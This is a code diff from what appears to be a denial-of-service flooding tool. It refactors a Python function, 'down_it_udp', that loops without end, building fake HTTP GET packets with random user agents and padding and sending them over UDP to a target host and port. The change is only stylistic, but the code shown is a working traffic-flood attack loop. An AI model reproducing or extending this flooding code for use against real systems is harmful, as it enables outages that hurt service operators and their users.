@@ -110,16 +110,8 @@ def down_it_udp(_ctx: Context):
     i = 1
     while True:
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
-
-        packet = str(
-            "GET / HTTP/1.1\nHost: " + _ctx.host
-            + "\n\n User-Agent: "
-            + random.choice(_ctx.user_agents)
-            + "\n" + _ctx.base_headers[0]
-            + "\n\n" + extra_data).encode('utf-8')
-
+        packet = f'GET / HTTP/1.1\nHost: {_ctx.host}\n\n User-Agent: {random.choice(_ctx.user_agents)}\n{_ctx.base_headers[0]}\n\n{extra_data}'.encode('utf-8')
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # p = int(_ctx.port) if _ctx.port else get_random_port()
 
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
